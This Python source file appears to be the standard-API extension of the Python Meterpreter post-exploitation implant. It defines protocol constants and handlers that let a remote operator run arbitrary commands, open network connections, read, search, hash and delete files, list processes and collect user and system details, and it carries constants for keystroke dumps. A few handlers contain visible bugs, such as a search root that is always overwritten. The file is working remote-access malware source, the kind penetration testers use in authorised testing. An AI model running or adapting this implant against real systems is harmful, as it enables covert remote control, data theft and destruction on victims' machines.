import os
import sys
import shlex
import socket
import struct
import shutil
import fnmatch
import getpass
import platform
import subprocess

##
# STDAPI
##

#
# TLV Meta Types
#
TLV_META_TYPE_NONE =       (   0   )
TLV_META_TYPE_STRING =     (1 << 16)
TLV_META_TYPE_UINT =       (1 << 17)
TLV_META_TYPE_RAW =        (1 << 18)
TLV_META_TYPE_BOOL =       (1 << 19)
TLV_META_TYPE_COMPRESSED = (1 << 29)
TLV_META_TYPE_GROUP =      (1 << 30)
TLV_META_TYPE_COMPLEX =    (1 << 31)
# not defined in original
TLV_META_TYPE_MASK =    (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)

#
# TLV Specific Types
#
TLV_TYPE_ANY =                 TLV_META_TYPE_NONE   |   0
TLV_TYPE_METHOD =              TLV_META_TYPE_STRING |   1
TLV_TYPE_REQUEST_ID =          TLV_META_TYPE_STRING |   2
TLV_TYPE_EXCEPTION =           TLV_META_TYPE_GROUP  |   3
TLV_TYPE_RESULT =              TLV_META_TYPE_UINT   |   4

TLV_TYPE_STRING =              TLV_META_TYPE_STRING |  10
TLV_TYPE_UINT =                TLV_META_TYPE_UINT   |  11
TLV_TYPE_BOOL =                TLV_META_TYPE_BOOL   |  12

TLV_TYPE_LENGTH =              TLV_META_TYPE_UINT   |  25
TLV_TYPE_DATA =                TLV_META_TYPE_RAW    |  26
TLV_TYPE_FLAGS =               TLV_META_TYPE_UINT   |  27

TLV_TYPE_CHANNEL_ID =          TLV_META_TYPE_UINT   |  50
TLV_TYPE_CHANNEL_TYPE =        TLV_META_TYPE_STRING |  51
TLV_TYPE_CHANNEL_DATA =        TLV_META_TYPE_RAW    |  52
TLV_TYPE_CHANNEL_DATA_GROUP =  TLV_META_TYPE_GROUP  |  53
TLV_TYPE_CHANNEL_CLASS =       TLV_META_TYPE_UINT   |  54

##
# General
##
TLV_TYPE_HANDLE =              TLV_META_TYPE_UINT    |  600
TLV_TYPE_INHERIT =             TLV_META_TYPE_BOOL    |  601
TLV_TYPE_PROCESS_HANDLE =      TLV_META_TYPE_UINT    |  630
TLV_TYPE_THREAD_HANDLE =       TLV_META_TYPE_UINT    |  631

##
# Fs
##
TLV_TYPE_DIRECTORY_PATH =      TLV_META_TYPE_STRING  | 1200
TLV_TYPE_FILE_NAME =           TLV_META_TYPE_STRING  | 1201
TLV_TYPE_FILE_PATH =           TLV_META_TYPE_STRING  | 1202
TLV_TYPE_FILE_MODE =           TLV_META_TYPE_STRING  | 1203
TLV_TYPE_FILE_SIZE =           TLV_META_TYPE_UINT    | 1204

TLV_TYPE_STAT_BUF =            TLV_META_TYPE_COMPLEX | 1220

TLV_TYPE_SEARCH_RECURSE =      TLV_META_TYPE_BOOL    | 1230
TLV_TYPE_SEARCH_GLOB =         TLV_META_TYPE_STRING  | 1231
TLV_TYPE_SEARCH_ROOT =         TLV_META_TYPE_STRING  | 1232
TLV_TYPE_SEARCH_RESULTS =      TLV_META_TYPE_GROUP   | 1233

##
# Net
##
TLV_TYPE_HOST_NAME =           TLV_META_TYPE_STRING  | 1400
TLV_TYPE_PORT =                TLV_META_TYPE_UINT    | 1401

TLV_TYPE_SUBNET =              TLV_META_TYPE_RAW     | 1420
TLV_TYPE_NETMASK =             TLV_META_TYPE_RAW     | 1421
TLV_TYPE_GATEWAY =             TLV_META_TYPE_RAW     | 1422
TLV_TYPE_NETWORK_ROUTE =       TLV_META_TYPE_GROUP   | 1423

TLV_TYPE_IP =                  TLV_META_TYPE_RAW     | 1430
TLV_TYPE_MAC_ADDRESS =         TLV_META_TYPE_RAW     | 1431
TLV_TYPE_MAC_NAME =            TLV_META_TYPE_STRING  | 1432
TLV_TYPE_NETWORK_INTERFACE =   TLV_META_TYPE_GROUP   | 1433

TLV_TYPE_SUBNET_STRING =       TLV_META_TYPE_STRING  | 1440
TLV_TYPE_NETMASK_STRING =      TLV_META_TYPE_STRING  | 1441
TLV_TYPE_GATEWAY_STRING =      TLV_META_TYPE_STRING  | 1442

# Socket
TLV_TYPE_PEER_HOST =           TLV_META_TYPE_STRING  | 1500
TLV_TYPE_PEER_PORT =           TLV_META_TYPE_UINT    | 1501
TLV_TYPE_LOCAL_HOST =          TLV_META_TYPE_STRING  | 1502
TLV_TYPE_LOCAL_PORT =          TLV_META_TYPE_UINT    | 1503
TLV_TYPE_CONNECT_RETRIES =     TLV_META_TYPE_UINT    | 1504

TLV_TYPE_SHUTDOWN_HOW =        TLV_META_TYPE_UINT    | 1530

##
# Sys
##
PROCESS_EXECUTE_FLAG_HIDDEN = (1 << 0)
PROCESS_EXECUTE_FLAG_CHANNELIZED = (1 << 1)
PROCESS_EXECUTE_FLAG_SUSPENDED = (1 << 2)
PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN = (1 << 3)

# Registry
TLV_TYPE_HKEY =                TLV_META_TYPE_UINT    | 1000
TLV_TYPE_ROOT_KEY =            TLV_TYPE_HKEY
TLV_TYPE_BASE_KEY =            TLV_META_TYPE_STRING  | 1001
TLV_TYPE_PERMISSION =          TLV_META_TYPE_UINT    | 1002
TLV_TYPE_KEY_NAME =            TLV_META_TYPE_STRING  | 1003
TLV_TYPE_VALUE_NAME =          TLV_META_TYPE_STRING  | 1010
TLV_TYPE_VALUE_TYPE =          TLV_META_TYPE_UINT    | 1011
TLV_TYPE_VALUE_DATA =          TLV_META_TYPE_RAW     | 1012

# Config
TLV_TYPE_COMPUTER_NAME =       TLV_META_TYPE_STRING  | 1040
TLV_TYPE_OS_NAME =             TLV_META_TYPE_STRING  | 1041
TLV_TYPE_USER_NAME =           TLV_META_TYPE_STRING  | 1042
TLV_TYPE_ARCHITECTURE  =       TLV_META_TYPE_STRING  | 1043

DELETE_KEY_FLAG_RECURSIVE = (1 << 0)

# Process
TLV_TYPE_BASE_ADDRESS =        TLV_META_TYPE_UINT    | 2000
TLV_TYPE_ALLOCATION_TYPE =     TLV_META_TYPE_UINT    | 2001
TLV_TYPE_PROTECTION =          TLV_META_TYPE_UINT    | 2002
TLV_TYPE_PROCESS_PERMS =       TLV_META_TYPE_UINT    | 2003
TLV_TYPE_PROCESS_MEMORY =      TLV_META_TYPE_RAW     | 2004
TLV_TYPE_ALLOC_BASE_ADDRESS =  TLV_META_TYPE_UINT    | 2005
TLV_TYPE_MEMORY_STATE =        TLV_META_TYPE_UINT    | 2006
TLV_TYPE_MEMORY_TYPE =         TLV_META_TYPE_UINT    | 2007
TLV_TYPE_ALLOC_PROTECTION =    TLV_META_TYPE_UINT    | 2008
TLV_TYPE_PID =                 TLV_META_TYPE_UINT    | 2300
TLV_TYPE_PROCESS_NAME =        TLV_META_TYPE_STRING  | 2301
TLV_TYPE_PROCESS_PATH =        TLV_META_TYPE_STRING  | 2302
TLV_TYPE_PROCESS_GROUP =       TLV_META_TYPE_GROUP   | 2303
TLV_TYPE_PROCESS_FLAGS =       TLV_META_TYPE_UINT    | 2304
TLV_TYPE_PROCESS_ARGUMENTS =   TLV_META_TYPE_STRING  | 2305
TLV_TYPE_PROCESS_ARCH =        TLV_META_TYPE_UINT    | 2306
TLV_TYPE_PARENT_PID =          TLV_META_TYPE_UINT    | 2307

TLV_TYPE_IMAGE_FILE =          TLV_META_TYPE_STRING  | 2400
TLV_TYPE_IMAGE_FILE_PATH =     TLV_META_TYPE_STRING  | 2401
TLV_TYPE_PROCEDURE_NAME =      TLV_META_TYPE_STRING  | 2402
TLV_TYPE_PROCEDURE_ADDRESS =   TLV_META_TYPE_UINT    | 2403
TLV_TYPE_IMAGE_BASE =          TLV_META_TYPE_UINT    | 2404
TLV_TYPE_IMAGE_GROUP =         TLV_META_TYPE_GROUP   | 2405
TLV_TYPE_IMAGE_NAME =          TLV_META_TYPE_STRING  | 2406

TLV_TYPE_THREAD_ID =           TLV_META_TYPE_UINT    | 2500
TLV_TYPE_THREAD_PERMS =        TLV_META_TYPE_UINT    | 2502
TLV_TYPE_EXIT_CODE =           TLV_META_TYPE_UINT    | 2510
TLV_TYPE_ENTRY_POINT =         TLV_META_TYPE_UINT    | 2511
TLV_TYPE_ENTRY_PARAMETER =     TLV_META_TYPE_UINT    | 2512
TLV_TYPE_CREATION_FLAGS =      TLV_META_TYPE_UINT    | 2513

TLV_TYPE_REGISTER_NAME =       TLV_META_TYPE_STRING  | 2540
TLV_TYPE_REGISTER_SIZE =       TLV_META_TYPE_UINT    | 2541
TLV_TYPE_REGISTER_VALUE_32 =   TLV_META_TYPE_UINT    | 2542
TLV_TYPE_REGISTER =            TLV_META_TYPE_GROUP   | 2550

##
# Ui
##
TLV_TYPE_IDLE_TIME =           TLV_META_TYPE_UINT    | 3000
TLV_TYPE_KEYS_DUMP =           TLV_META_TYPE_STRING  | 3001
TLV_TYPE_DESKTOP =             TLV_META_TYPE_STRING  | 3002

##
# Event Log
##
TLV_TYPE_EVENT_SOURCENAME =    TLV_META_TYPE_STRING  | 4000
TLV_TYPE_EVENT_HANDLE =        TLV_META_TYPE_UINT    | 4001
TLV_TYPE_EVENT_NUMRECORDS =    TLV_META_TYPE_UINT    | 4002

TLV_TYPE_EVENT_READFLAGS =     TLV_META_TYPE_UINT    | 4003
TLV_TYPE_EVENT_RECORDOFFSET =  TLV_META_TYPE_UINT    | 4004

TLV_TYPE_EVENT_RECORDNUMBER =  TLV_META_TYPE_UINT    | 4006
TLV_TYPE_EVENT_TIMEGENERATED = TLV_META_TYPE_UINT    | 4007
TLV_TYPE_EVENT_TIMEWRITTEN =   TLV_META_TYPE_UINT    | 4008
TLV_TYPE_EVENT_ID =            TLV_META_TYPE_UINT    | 4009
TLV_TYPE_EVENT_TYPE =          TLV_META_TYPE_UINT    | 4010
TLV_TYPE_EVENT_CATEGORY =      TLV_META_TYPE_UINT    | 4011
TLV_TYPE_EVENT_STRING =        TLV_META_TYPE_STRING  | 4012
TLV_TYPE_EVENT_DATA =          TLV_META_TYPE_RAW     | 4013

##
# Power
##
TLV_TYPE_POWER_FLAGS =         TLV_META_TYPE_UINT    | 4100
TLV_TYPE_POWER_REASON =        TLV_META_TYPE_UINT    | 4101

##
# Errors
##
ERROR_SUCCESS = 0
# not defined in original C implementation
ERROR_FAILURE = 1

# Special return value to match up with Windows error codes for network
# errors.
ERROR_CONNECTION_ERROR = 10000

def get_stat_buffer(path):
	si = os.stat(path)
	rdev = 0
	if hasattr(si, 'st_rdev'):
		rdev = si.st_rdev
	blksize = 0
	if hasattr(si, 'st_blksize'):
		blksize = si.st_blksize
	blocks = 0
	if hasattr(si, 'st_blocks'):
		blocks = si.st_blocks
	st_buf = struct.pack('<IHHH', si.st_dev, min(0xffff, si.st_ino), si.st_mode, si.st_nlink)
	st_buf += struct.pack('<HHHI', si.st_uid, si.st_gid, 0, rdev)
	st_buf += struct.pack('<IIII', si.st_size, si.st_atime, si.st_mtime, si.st_ctime)
	st_buf += struct.pack('<II', blksize, blocks)
	return st_buf

@meterpreter.register_function
def channel_create_stdapi_fs_file(request, response):
	fpath = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
	fmode = packet_get_tlv(request, TLV_TYPE_FILE_MODE)
	if fmode:
		fmode = fmode['value']
	else:
		fmode = 'rb'
	file_h = open(fpath, fmode)
	channel_id = len(meterpreter.channels)
	meterpreter.channels[channel_id] = file_h
	response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def channel_create_stdapi_net_tcp_client(request, response):
	host = packet_get_tlv(request, TLV_TYPE_PEER_HOST)['value']
	port = packet_get_tlv(request, TLV_TYPE_PEER_PORT)['value']
	local_host = packet_get_tlv(request, TLV_TYPE_LOCAL_HOST)
	local_port = packet_get_tlv(request, TLV_TYPE_LOCAL_PORT)
	retries = packet_get_tlv(request, TLV_TYPE_CONNECT_RETRIES).get('value', 1)
	connected = False
	for i in range(retries + 1):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		if local_host.get('value') and local_port.get('value'):
			sock.bind((local_host['value'], local_port['value']))
		try:
			sock.connect((host, port))
			connected = True
			break
		except:
			pass
	if not connected:
		return ERROR_CONNECTION_ERROR, response
	channel_id = len(meterpreter.channels)
	meterpreter.channels[channel_id] = sock
	response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_sys_config_getuid(request, response):
	response += tlv_pack(TLV_TYPE_USER_NAME, getpass.getuser())
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_sys_config_sysinfo(request, response):
	uname_info = platform.uname()
	response += tlv_pack(TLV_TYPE_COMPUTER_NAME, uname_info[1])
	response += tlv_pack(TLV_TYPE_OS_NAME, uname_info[0] + ' ' + uname_info[2] + ' ' + uname_info[3])
	arch = uname_info[4]
	if not arch and uname_info[1] == 'Windows':
		if platform.architecture()[0] == '32bit':
			arch = 'x86'
		elif platform.architecture()[0] == '64bit':
			arch = 'x86_64'
	response += tlv_pack(TLV_TYPE_ARCHITECTURE, arch)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_sys_process_close(request, response):
	proc_h_id = packet_get_tlv(request, TLV_TYPE_PROCESS_HANDLE)
	if not proc_h_id:
		return ERROR_SUCCESS, response
	proc_h_id = proc_h_id['value']
	if not proc_h_id in meterpreter.processes:
		print("[-] trying to close non-existent channel: " + str(proc_h_id))
	proc_h = meterpreter.channels[proc_h_id]
	proc_h.kill()
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_sys_process_execute(request, response):
	cmd = packet_get_tlv(request, TLV_TYPE_PROCESS_PATH)['value']
	raw_args = packet_get_tlv(request, TLV_TYPE_PROCESS_ARGUMENTS)
	if raw_args:
		raw_args = raw_args['value']
	else:
		raw_args = ""
	flags = packet_get_tlv(request, TLV_TYPE_PROCESS_FLAGS)['value']
	if len(cmd) == 0:
		return ERROR_FAILURE, response
	args = [cmd]
	args.extend(shlex.split(raw_args))
	if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED):
		proc_h = STDProcess(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	else:
		proc_h = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	proc_h_id = len(meterpreter.processes)
	meterpreter.processes[proc_h_id] = proc_h
	response += tlv_pack(TLV_TYPE_PID, proc_h.pid)
	response += tlv_pack(TLV_TYPE_PROCESS_HANDLE, proc_h_id)
	if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED):
		channel_id = len(meterpreter.channels)
		meterpreter.channels[channel_id] = proc_h
		response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_sys_process_getpid(request, response):
	response += tlv_pack(TLV_TYPE_PID, os.getpid())
	return ERROR_SUCCESS, response

def stdapi_sys_process_get_processes_via_proc(request, response):
	for pid in os.listdir('/proc'):
		pgroup = ''
		if not os.path.isdir(os.path.join('/proc', pid)) or not pid.isdigit():
			continue
		cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read(512).replace('\x00', ' ')
		status_data = open(os.path.join('/proc', pid, 'status'), 'rb').read()
		status_data = map(lambda x: x.split('\t',1), status_data.split('\n'))
		status_data = filter(lambda x: len(x) == 2, status_data)
		status = {}
		for k, v in status_data:
			status[k[:-1]] = v.strip()
		ppid = status.get('PPid')
		uid = status.get('Uid').split('\t', 1)[0]
		if cmd:
			pname = os.path.basename(cmd.split(' ', 1)[0])
			ppath = cmd
		else:
			pname = '[' + status['Name'] + ']'
			ppath = ''
		pgroup += tlv_pack(TLV_TYPE_PID, int(pid))
		if ppid:
			pgroup += tlv_pack(TLV_TYPE_PARENT_PID, int(ppid))
		pgroup += tlv_pack(TLV_TYPE_USER_NAME, uid)
		pgroup += tlv_pack(TLV_TYPE_PROCESS_NAME, pname)
		pgroup += tlv_pack(TLV_TYPE_PROCESS_PATH, ppath)
		response += tlv_pack(TLV_TYPE_PROCESS_GROUP, pgroup)
	return ERROR_SUCCESS, response


@meterpreter.register_function
def stdapi_sys_process_get_processes(request, response):
	if os.path.isdir('/proc'):
		return stdapi_sys_process_get_processes_via_proc(request, response)
	return ERROR_FAILURE, response

@meterpreter.register_function
def stdapi_fs_chdir(request, response):
	wd = packet_get_tlv(request, TLV_TYPE_DIRECTORY_PATH)['value']
	os.chdir(wd)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_delete(request, response):
	file_path = packet_get_tlv(request, TLV_TYPE_FILE_NAME)['value']
	os.unlink(file_path)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_delete_dir(request, response):
	dir_path = packet_get_tlv(request, TLV_TYPE_DIRECTORY_PATH)['value']
	if os.path.islink(dir_path):
		del_func = os.unlink
	else:
		del_func = shutil.rmtree
	del_func(dir_path)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_delete_file(request, response):
	file_path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
	os.unlink(file_path)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_file_expand_path(request, response):
	path_tlv = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
	if path_tlv == '%COMSPEC%':
		if platform.system() == 'Windows':
			result = 'cmd.exe'
		else:
			result = '/bin/sh'
	elif path_tlv in ['%TEMP%', '%TMP%'] and platform.system() != 'Windows':
		result = '/tmp'
	else:
		result = os.getenv(path_tlv)
	if not result:
		return ERROR_FAILURE, response
	response += tlv_pack(TLV_TYPE_FILE_PATH, result)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_getwd(request, response):
	response += tlv_pack(TLV_TYPE_DIRECTORY_PATH, os.getcwd())
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_ls(request, response):
	path = packet_get_tlv(request, TLV_TYPE_DIRECTORY_PATH)['value']
	path = os.path.abspath(path)
	contents = os.listdir(path)
	contents.sort()
	for x in contents:
		y = os.path.join(path, x)
		response += tlv_pack(TLV_TYPE_FILE_NAME, x)
		response += tlv_pack(TLV_TYPE_FILE_PATH, y)
		response += tlv_pack(TLV_TYPE_STAT_BUF, get_stat_buffer(y))
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_md5(request, response):
	if sys.version_info[0] == 2 and sys.version_info[1] < 5:
		import md5
		m = md5.new()
	else:
		import hashlib
		m = hashlib.md5()
	path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
	m.update(open(path, 'rb').read())
	response += tlv_pack(TLV_TYPE_FILE_NAME, m.hexdigest())
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_mkdir(request, response):
	dir_path = packet_get_tlv(request, TLV_TYPE_DIRECTORY_PATH)['value']
	os.mkdir(dir_path)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_search(request, response):
	search_root = packet_get_tlv(request, TLV_TYPE_SEARCH_ROOT).get('value', '.')
	search_root = ('' or '.') # sometimes it's an empty string
	glob = packet_get_tlv(request, TLV_TYPE_SEARCH_GLOB)['value']
	recurse = packet_get_tlv(request, TLV_TYPE_SEARCH_RECURSE)['value']
	if recurse:
		for root, dirs, files in os.walk(search_root):
			for f in filter(lambda f: fnmatch.fnmatch(f, glob), files):
				file_tlv  = ''
				file_tlv += tlv_pack(TLV_TYPE_FILE_PATH, root)
				file_tlv += tlv_pack(TLV_TYPE_FILE_NAME, f)
				file_tlv += tlv_pack(TLV_TYPE_FILE_SIZE, os.stat(os.path.join(root, f)).st_size)
				response += tlv_pack(TLV_TYPE_SEARCH_RESULTS, file_tlv)
	else:
		for f in filter(lambda f: fnmatch.fnmatch(f, glob), os.listdir(search_root)):
			file_tlv  = ''
			file_tlv += tlv_pack(TLV_TYPE_FILE_PATH, search_root)
			file_tlv += tlv_pack(TLV_TYPE_FILE_NAME, f)
			file_tlv += tlv_pack(TLV_TYPE_FILE_SIZE, os.stat(os.path.join(search_root, f)).st_size)
			response += tlv_pack(TLV_TYPE_SEARCH_RESULTS, file_tlv)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_separator(request, response):
	response += tlv_pack(TLV_TYPE_STRING, os.sep)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_sha1(request, response):
	if sys.version_info[0] == 2 and sys.version_info[1] < 5:
		import sha1
		m = sha1.new()
	else:
		import hashlib
		m = hashlib.sha1()
	path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
	m.update(open(path, 'rb').read())
	response += tlv_pack(TLV_TYPE_FILE_NAME, m.hexdigest())
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_fs_stat(request, response):
	path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
	st_buf = get_stat_buffer(path)
	response += tlv_pack(TLV_TYPE_STAT_BUF, st_buf)
	return ERROR_SUCCESS, response

@meterpreter.register_function
def stdapi_net_socket_tcp_shutdown(request, response):
	channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)
	channel = meterpreter.channels[channel_id]
	channel.close()
	return ERROR_SUCCESS, response
